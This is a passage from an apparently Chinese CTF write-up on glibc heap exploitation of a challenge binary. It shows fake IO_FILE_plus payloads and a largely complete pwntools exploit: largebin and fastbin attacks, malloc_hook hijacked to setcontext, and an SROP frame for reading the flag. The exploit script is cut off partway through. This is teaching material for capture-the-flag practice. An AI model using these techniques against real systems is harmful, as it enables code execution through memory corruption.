+<p>我们进行简单的调试直观的看一下，首先我们通过chunkoverlapping来在0xa0的堆块中放入两个堆块，此时的bin:</p>
+
+<p><a href="https://p3.ssl.qhimg.com/t017a32afa21fdf6fb5.png"><img src="https://p3.ssl.qhimg.com/t017a32afa21fdf6fb5.png" alt="img" /></a></p>
+
+<p>然后我们看一下我们的fake IO_FILE_plus
+<strong>Fake IO_FILE_plus1(malloc(0x90))</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5</pre></td><td class="code"><pre class="highlight"><code>payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #rdx
+payload += p64(heap_base+0x10+0x290)+p64(heap_base+22+0x10+0x290)+p64(0)*4 #size
+payload += p64(heap_base+0x1a90)+p64(0)+p64(0)+"\x00"*8 #_chain
+payload += p64(0)*4+"\x00"*48
+payload += p64(0x1ed560+libc_base)
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>可以看到第二行的两个地址差22，而通过我们的size计算可以得出size = (0x90-100)/2 = 22</p>
+
+<p><a href="https://p4.ssl.qhimg.com/t010103630cc92153e2.png"><img src="https://p4.ssl.qhimg.com/t010103630cc92153e2.png" alt="img" /></a></p>
+
+<p>执行完之后：</p>
+
+<p><a href="https://p4.ssl.qhimg.com/t019a05f4eec2600874.png"><img src="https://p4.ssl.qhimg.com/t019a05f4eec2600874.png" alt="img" /></a></p>
+
+<p><strong>Fake IO_FILE_plus2(malloc(0x90) &amp;&amp; hijack malloc_hook = setcontext)</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5</pre></td><td class="code"><pre class="highlight"><code>payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #rdx
+payload += p64(heap_base+0x30+0x290)+p64(heap_base+22+0x30+0x290)+p64(0)*4 #size
+payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8 #chain
+payload += p64(0)*4+"\x00"*48
+payload += p64(0x1ed560+libc_base)
+</code></pre></td></tr></tbody></table></div></div>
+
+<p><a href="https://p3.ssl.qhimg.com/t019bbb73d2089b8dab.png"><img src="https://p3.ssl.qhimg.com/t019bbb73d2089b8dab.png" alt="img" /></a></p>
+
+<p>执行之后：</p>
+
+<p><a href="https://p4.ssl.qhimg.com/t01359312968708ac80.png"><img src="https://p4.ssl.qhimg.com/t01359312968708ac80.png" alt="img" /></a></p>
+
+<p>可以看到已经成功将malloc_hook劫持为setcontext,接下来执行第三个IO_FILE_plus就会触发srop，orw出flag
+<strong>Fake IO_FILE_plus3:(srop)</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5</pre></td><td class="code"><pre class="highlight"><code>payload = p64(0)*2+p64(0)+p64(heap_base+0x29d0)+p64(0) #write
+payload += p64(heap_base+0x50+0x290)+p64(heap_base+22+0x50+0x290)+p64(0)*4
+payload += p64(heap_base+0x1fa0)+p64(0)+p64(0)+"\x00"*8
+payload += p64(0)*4+"\x00"*48
+payload += p64(0x1ed560+libc_base)
+</code></pre></td></tr></tbody></table></div></div>
+
+<p><a href="https://p0.ssl.qhimg.com/t0195570e6d822ae8e8.png"><img src="https://p0.ssl.qhimg.com/t0195570e6d822ae8e8.png" alt="img" /></a></p>
+
+<p><a href="https://p0.ssl.qhimg.com/t01114db3b46acbee25.png"><img src="https://p0.ssl.qhimg.com/t01114db3b46acbee25.png" alt="img" /></a></p>
+
+<h3 id="完整exp">完整exp:</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42<br/>43<br/>44<br/>45<br/>46<br/>47<br/>48<br/>49<br/>50<br/>51<br/>52<br/>53<br/>54<br/>55<br/>56<br/>57<br/>58<br/>59<br/>60<br/>61<br/>62<br/>63<br/>64<br/>65<br/>66<br/>67<br/>68<br/>69<br/>70<br/>71<br/>72<br/>73<br/>74<br/>75<br/>76<br/>77<br/>78<br/>79<br/>80<br/>81<br/>82<br/>83<br/>84<br/>85<br/>86<br/>87<br/>88<br/>89<br/>90<br/>91<br/>92<br/>93<br/>94<br/>95<br/>96<br/>97<br/>98<br/>99<br/>100<br/>101<br/>102<br/>103<br/>104<br/>105<br/>106<br/>107<br/>108<br/>109<br/>110<br/>111<br/>112<br/>113<br/>114<br/>115<br/>116<br/>117<br/>118<br/>119<br/>120<br/>121<br/>122<br/>123<br/>124<br/>125<br/>126<br/>127<br/>128<br/>129<br/>130<br/>131<br/>132<br/>133<br/>134<br/>135<br/>136<br/>137<br/>138<br/>139<br/>140<br/>141<br/>142<br/>143<br/>144<br/>145<br/>146<br/>147<br/>148<br/>149<br/>150<br/>151<br/>152<br/>153<br/>154<br/>155<br/>156<br/>157<br/>158<br/>159<br/>160<br/>161<br/>162</pre></td><td class="code"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding: utf-8 -*-</span>
+<span class="c"># @Author: cnitlrt</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c"># context.log_level = 'debug'</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./cookie'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./cookie'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span>
+
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+  <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">port</span> <span class="o">=</span>  <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+  <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="n">o_g</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span><span class="mh">0x4526a</span><span class="p">,</span><span class="mh">0xf02a4</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>
+<span class="n">magic</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x3c4b10</span><span class="p">,</span><span class="mh">0x3c67a8</span><span class="p">,</span><span class="mh">0x846c0</span><span class="p">,</span><span class="mh">0x45390</span><span class="p">]</span><span class="c">#malloc,free,realloc,system</span>
+<span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\x7f</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\xf7</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+<span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+<span class="n">lg</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s">": 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">se</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">rl</span>  <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span>     <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"&gt;&gt;"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Size:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s">"Content:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Index:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Index:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">"Index:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">sa</span><span class="p">(</span><span class="s">"Content:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">ss</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x458</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x468</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span><span class="c">#3</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span><span class="c">#4</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span><span class="c">#5</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span><span class="c">#6</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span><span class="c">#7</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span><span class="c">#8</span>
+    <span class="c">#leak libc_base</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">l64</span><span class="p">()</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="o">-</span><span class="mi">96</span>
+    <span class="n">lg</span><span class="p">(</span><span class="s">"libc_base"</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
+    <span class="c">#put chunk2 into largebin</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x600</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span><span class="c">#9</span>
+    <span class="c">#leak heap_base</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x19</span><span class="p">)</span>
+    <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">ru</span><span class="p">(</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0xc61</span>
+    <span class="n">lg</span><span class="p">(</span><span class="s">"heap_base"</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span> 
+    <span class="c">#put chunk0 into unsortedbin</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="c">#hijack stderr-&gt;_chain = chunk2</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1ec628</span><span class="o">+</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span><span class="c">#stderr-&gt;_chain</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x448</span><span class="p">,</span><span class="s">"aaa"</span><span class="p">)</span><span class="c">#10</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+    <span class="c">#hijack global_max_fast = chunk2</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1eeb80</span><span class="o">+</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span><span class="c">#global_max_fast</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x448</span><span class="p">,</span><span class="s">"aaa"</span><span class="p">)</span><span class="c">#11</span>
+    <span class="c">#chunk overlapping</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x511</span><span class="p">))</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x30</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10c0</span><span class="p">))</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"aaa"</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="s">"ddd"</span><span class="p">)</span><span class="c">#13</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x90</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x471</span><span class="p">))</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x4b0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">))</span>
+    <span class="c">#fastbin attrack</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span><span class="o">+</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span><span class="o">+</span><span class="n">libc_base</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="s">"""
+    tcachebins
+    0xa0 [  2]: 0x56074fb96590 —▸ 0x7f116d446b60 (__memalign_hook) —▸ 0x7f116d2f8570 (memalign_hook_ini) ◂— ...
+    fastbins
+
+    """</span>
+    <span class="n">chunk1_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x290</span>
+    <span class="n">chunk5_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1a90</span>
+    <span class="n">chunk6_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1fa0</span>
+    <span class="n">chunk8_addr</span> <span class="o">=</span> <span class="n">heap_base</span><span class="o">+</span><span class="mh">0x29d0</span>
+    <span class="n">io_str_overflow_61</span> <span class="o">=</span> <span class="mh">0x1ed560</span><span class="o">+</span><span class="n">libc_base</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x580dd</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c">#setcontext</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+    <span class="c">#malloc(0x90)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk8_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c">#write</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk1_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">22</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="n">chunk1_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk5_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">48</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_str_overflow_61</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c">#malloc(0x90) &amp;&amp; set malloc_hook = setcontext + 0x61</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk8_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c">#write</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x30</span><span class="o">+</span><span class="mh">0x290</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk1_addr</span><span class="o">+</span><span class="mi">22</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk6_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">48</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_str_overflow_61</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c">#trigger &amp;&amp; rdx = QWORD PTR [rdi+0x28] = heap_base+0x29d0</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk8_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c">#write</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk1_addr</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">chunk1_addr</span><span class="o">+</span><span class="mi">22</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk6_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">48</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">io_str_overflow_61</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c"># ss()</span>
+    <span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__free_hook"</span><span class="p">]</span>
+    <span class="n">free_hook1</span> <span class="o">=</span> <span class="n">free_hook</span><span class="o">&amp;</span><span class="mh">0xfffffffffffff000</span>
+    <span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000066229</span>
+    <span class="c">#fakeframe</span>
+    <span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">free_hook1</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x2000</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">free_hook1</span>
+    <span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
+
